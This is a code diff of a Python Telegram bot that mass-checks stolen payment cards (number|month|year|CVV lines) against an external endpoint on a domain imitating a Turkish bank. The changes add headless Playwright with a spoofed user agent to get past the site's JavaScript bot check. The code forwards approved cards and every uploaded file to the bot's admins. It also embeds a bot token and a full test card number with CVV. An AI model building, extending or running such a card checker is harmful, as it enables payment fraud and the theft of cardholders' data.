@@ -8,12 +8,13 @@ import os
 from datetime import datetime
 import re
 from typing import Dict, List
+from urllib.parse import quote
 
 # ========== KONFİGÜRASYON ==========
 TOKEN = "8516981652:AAGl7kQFtSNfjRDoNbMbu4B6mBu0tGct5hk"
 ADMINS = [7202281434, 6322020905]
 CHANNEL_USERNAME = "@redbullbanksh"
-API_URL = "https://isbankasi.gt.tc/Api/Rewix/auth.php?kart="
+API_URL = "https://isbankasi.gt.tc/Api/Rewix/auth.php"
 # ===================================
 
 # Global değişkenler
@@ -97,107 +98,152 @@ async def is_channel_member(user_id: int, context: CallbackContext) -> bool:
         logger.error(f"Kanal kontrol hatası: {e}")
         return False
 
-def parse_api_response(response_text: str) -> str:
-    """API yanıtını parse et - JavaScript'i filtrele"""
-    # JavaScript kodunu temizle
-    clean_text = re.sub(r'function\s+\w+\s*\([^)]*\)\s*{[^}]*}', '', response_text)
-    clean_text = re.sub(r'var\s+\w+\s*=.*?;', '', clean_text)
-    clean_text = re.sub(r'document\.cookie\s*=.*?;', '', clean_text)
-    clean_text = re.sub(r'location\.href\s*=.*?;', '', clean_text)
-    clean_text = re.sub(r'This site requires Javascript.*', '', clean_text)
-    
-    # HTML tag'lerini temizle
-    clean_text = re.sub(r'<[^>]+>', '', clean_text)
-    
-    # Fazla boşlukları temizle
-    clean_text = re.sub(r'\s+', ' ', clean_text).strip()
-    
-    return clean_text if clean_text else "No response text"
-
-async def check_cc(cc_number: str) -> Dict:
-    """CC API kontrolü - JavaScript sorununu çözelim"""
+async def check_cc_with_playwright(cc_number: str) -> Dict:
+    """Playwright ile CC kontrolü (JavaScript çalıştırır)"""
     try:
-        # URL encode kart bilgisi
-        cc_encoded = cc_number.replace("|", "%7C")
-        url = f"{API_URL}{cc_encoded}"
+        # Playwright'ı dynamic import et
+        try:
+            from playwright.async_api import async_playwright
+            playwright_available = True
+        except ImportError:
+            logger.error("Playwright kurulu değil! Lütfen kurun: pip install playwright && playwright install")
+            return {
+                "status": "error",
+                "message": "Playwright kurulu değil",
+                "cc": cc_number,
+                "result_status": "error"
+            }
         
-        # JavaScript'i atlatmak için özel headers
+        logger.info(f"Playwright ile kontrol başlıyor: {cc_number[:10]}...")
+        
+        async with async_playwright() as p:
+            # Tarayıcıyı başlat
+            browser = await p.chromium.launch(headless=True)
+            context = await browser.new_context(
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            )
+            page = await context.new_page()
+            
+            try:
+                # API sayfasına git
+                url = f"{API_URL}?kart={quote(cc_number)}"
+                await page.goto(url, wait_until="networkidle", timeout=30000)
+                
+                # Sayfa yüklendi mi kontrol et
+                content = await page.content()
+                
+                # JavaScript hatası var mı kontrol et
+                if "requires Javascript" in content or "document.cookie" in content:
+                    # JavaScript çalıştıktan sonra tekrar bekle
+                    await page.wait_for_timeout(3000)
+                    content = await page.content()
+                
+                # Sayfadaki metni al
+                text_content = await page.inner_text("body")
+                
+                # Status kontrolü
+                status = "declined"
+                content_lower = text_content.lower()
+                
+                if "approved" in content_lower or "live" in content_lower:
+                    status = "approved"
+                
+                # Temiz metin
+                clean_text = re.sub(r'\s+', ' ', text_content).strip()
+                clean_text = clean_text[:500]  # Uzunluğu sınırla
+                
+                await browser.close()
+                
+                return {
+                    "status": "success",
+                    "data": clean_text,
+                    "cc": cc_number,
+                    "result_status": status
+                }
+                
+            except Exception as e:
+                await browser.close()
+                return {
+                    "status": "error",
+                    "message": f"Playwright hatası: {str(e)}",
+                    "cc": cc_number,
+                    "result_status": "error"
+                }
+                
+    except Exception as e:
+        return {
+            "status": "error",
+            "message": f"Playwright başlatma hatası: {str(e)}",
+            "cc": cc_number,
+            "result_status": "error"
+        }
+
+async def check_cc_with_requests(cc_number: str) -> Dict:
+    """Normal HTTP isteği ile CC kontrolü (backup)"""
+    try:
+        # Kart bilgisini encode et
+        cc_encoded = quote(cc_number)
+        url = f"https://isbankasi.gt.tc/Api/Rewix/auth.php?kart={cc_encoded}"
+        
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Cache-Control': 'max-age=0'
         }
         
         async with aiohttp.ClientSession() as session:
-            # İlk istek - cookie almak için
-            async with session.get("https://isbankasi.gt.tc/Api/Rewix/auth.php", headers=headers, timeout=30) as first_response:
-                pass
-            
-            # Asıl istek
-            async with session.get(url, headers=headers, timeout=30, allow_redirects=True) as response:
+            async with session.get(url, headers=headers, timeout=30) as response:
                 result = await response.text()
                 
                 # JavaScript kontrolü
-                if "requires Javascript" in result or "document.cookie" in result:
-                    # JavaScript hatası - başka bir yaklaşım deneyelim
+                if "requires Javascript" in result:
                     return {
-                        "status": "error",
+                        "status": "javascript_error",
                         "message": "API JavaScript gerektiriyor",
                         "cc": cc_number,
-                        "result_status": "error",
-                        "data": "API şu an çalışmıyor (JavaScript gerekli)"
+                        "result_status": "error"
                     }
-                
-                # API yanıtını parse et
-                parsed_result = parse_api_response(result)
                 
                 # Status kontrolü
                 status = "declined"
                 result_lower = result.lower()
                 
-                # Approved kontrolü - farklı pattern'ler
-                approved_patterns = [
-                    "approved", 
-                    "live", 
-                    "success",
-                    "auth",
-                    "stripe"
-                ]
+                if "approved" in result_lower or "live" in result_lower:
+                    status = "approved"
                 
-                for pattern in approved_patterns:
-                    if pattern in result_lower:
-                        status = "approved"
-                        break
+                # HTML'den metin çıkar
+                clean_text = re.sub(r'<[^>]+>', '', result)
+                clean_text = re.sub(r'\s+', ' ', clean_text).strip()
+                clean_text = clean_text[:500]
                 
                 return {
-                    "status": "success", 
-                    "data": parsed_result[:500],  # Mesaj uzunluğunu sınırla
+                    "status": "success",
+                    "data": clean_text,
                     "cc": cc_number,
-                    "result_status": status,
-                    "raw_length": len(result)
+                    "result_status": status
                 }
                 
-    except aiohttp.ClientError as e:
-        return {
-            "status": "error", 
-            "message": f"Connection error: {str(e)}", 
-            "cc": cc_number, 
-            "result_status": "error"
-        }
     except Exception as e:
         return {
-            "status": "error", 
-            "message": f"Unexpected error: {str(e)}", 
-            "cc": cc_number, 
+            "status": "error",
+            "message": f"HTTP hatası: {str(e)}",
+            "cc": cc_number,
             "result_status": "error"
         }
+
+async def check_cc(cc_number: str) -> Dict:
+    """CC kontrolü - önce normal, sonra playwright"""
+    logger.info(f"CC kontrolü başlatılıyor: {cc_number[:10]}...")
+    
+    # Önce normal HTTP isteği dene
+    result = await check_cc_with_requests(cc_number)
+    
+    # Eğer JavaScript hatası alırsak, playwright dene
+    if result['status'] == 'javascript_error':
+        logger.info(f"JavaScript hatası, Playwright deneniyor: {cc_number[:10]}...")
+        result = await check_cc_with_playwright(cc_number)
+    
+    return result
 
 async def start(update: Update, context: CallbackContext):
     """Başlangıç komutu"""
@@ -236,8 +282,9 @@ async def start(update: Update, context: CallbackContext):
 • 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
 • ⏸️ Check işlemlerini durdurabilirsiniz
 • 📁 Tüm dosyalar size gönderilir
+• 🚀 Playwright ile JavaScript desteği
 
-⚠️ NOT: API bazen JavaScript hatası verebilir!
+📌 NOT: Bot tam çalışması için Playwright kurulumu gerekir!
 """
     else:
         welcome_text = f"""
@@ -254,6 +301,7 @@ async def start(update: Update, context: CallbackContext):
 • ♾️ Sınırsız kullanım
 • ⚡ Anlık sonuç bildirimi
 • 📁 Approved/Declined raporu
+• 🚀 JavaScript desteği (Playwright)
 
 🔧 KOMUTLAR:
 /start - Botu başlat
@@ -263,7 +311,7 @@ async def start(update: Update, context: CallbackContext):
 
 ⚠️ NOT: 
 • Bir işlem bitmeden yenisini başlatamazsınız!
-• API bazen "JavaScript gerekli" hatası verebilir
+• İlk başta yavaş çalışabilir (tarayıcı başlatma)
 """
     
     await update.message.reply_text(welcome_text)
@@ -408,7 +456,7 @@ async def start_check(update: Update, context: CallbackContext):
         f"⏳ İlerleme: 0/{total} (0%)\n"
         f"✅ Approved: 0\n"
         f"❌ Declined: 0\n"
-        f"⚠️ Not: API JavaScript hatası verebilir!"
+        f"🔄 Playwright kullanılıyor..."
     )
     session.progress_message = progress_msg
     
@@ -471,18 +519,17 @@ async def start_check(update: Update, context: CallbackContext):
             except Exception as e:
                 logger.error(f"Hata mesajı gönderme hatası: {e}")
         
-        # Progress güncelle (her 5 kartta bir)
-        if idx % 5 == 0 or idx == total:
-            progress = session.get_progress()
-            try:
-                await progress_msg.edit_text(
-                    f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
-                    f"✅ Approved: {progress['approved']}\n"
-                    f"❌ Declined: {progress['declined']}\n"
-                    f"⚠️ Hatalar: {error_count}"
-                )
-            except:
-                pass
+        # Progress güncelle (her kartta bir)
+        progress = session.get_progress()
+        try:
+            await progress_msg.edit_text(
+                f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
+                f"✅ Approved: {progress['approved']}\n"
+                f"❌ Declined: {progress['declined']}\n"
+                f"⚠️ Hatalar: {error_count}"
+            )
+        except:
+            pass
     
     # İşlem tamamlandı
     session.stop()
@@ -599,6 +646,8 @@ async def start_check(update: Update, context: CallbackContext):
     # Temizlik
     if os.path.exists(file_path):
         os.remove(file_path)
+
+# Diğer fonksiyonlar aynı kalacak (user_stats_command, admin_panel, list_users, stop_check, broadcast, help_command, cancel_check, check_admin)
 
 async def user_stats_command(update: Update, context: CallbackContext):
     """Kullanıcı istatistiklerini göster"""
@@ -824,7 +873,11 @@ async def help_command(update: Update, context: CallbackContext):
 • 📁 Tüm yüklenen dosyalar ve sonuçlar size gönderilir
 • 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
 • ⏸️ Check işlemlerini durdurabilirsiniz
-• ⚠️ API bazen JavaScript hatası verebilir!
+• 🚀 Playwright ile JavaScript desteği
+
+⚠️ KURULUM GEREKLİ:
+pip install playwright
+playwright install chromium
 """
     else:
         help_text = f"""
@@ -848,7 +901,6 @@ async def help_command(update: Update, context: CallbackContext):
 • Sadece .txt dosyaları kabul edilir
 • Kanal üyeliği zorunludur (@redbullbanksh)
 • ✅ Approved kartlar adminlere de bildirilir
-• ⚠️ API bazen "JavaScript gerekli" hatası verebilir
 """
     
     await update.message.reply_text(help_text)
@@ -898,6 +950,30 @@ async def check_admin(update: Update, context: CallbackContext):
     
     await update.message.reply_text(user_info)
 
+async def test_api(update: Update, context: CallbackContext):
+    """API test komutu"""
+    user = update.effective_user
+    
+    if not is_admin(user.id):
+        return
+    
+    await update.message.reply_text("🚀 API test ediliyor...")
+    
+    # Test kartı
+    test_cc = "5218076824032475|10|2028|228"
+    result = await check_cc(test_cc)
+    
+    test_result = f"""
+📊 API TEST SONUCU:
+💳 Test Kartı: {test_cc}
+✅ Durum: {result['status']}
+📊 Sonuç: {result['result_status']}
+📝 Mesaj: {result.get('message', 'N/A')}
+📋 Veri: {result.get('data', 'N/A')[:200]}
+"""
+    
+    await update.message.reply_text(test_result)
+
 def main():
     """Ana fonksiyon"""
     # Application oluştur
@@ -914,6 +990,7 @@ def main():
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("cancel", cancel_check))
     application.add_handler(CommandHandler("myid", check_admin))
+    application.add_handler(CommandHandler("testapi", test_api))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
     # Botu başlat
@@ -921,7 +998,10 @@ def main():
     print(f"👑 Admin ID'leri: {ADMINS}")
     print(f"📢 Kanal: {CHANNEL_USERNAME}")
     print(f"🔗 API: {API_URL}")
-    print("⚠️ NOT: API JavaScript gerektirebilir, bu durumda hata alabilirsiniz!")
+    print("\n⚠️ ÖNEMLİ KURULUM:")
+    print("1. pip install playwright")
+    print("2. playwright install chromium")
+    print("3. python bot.py")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
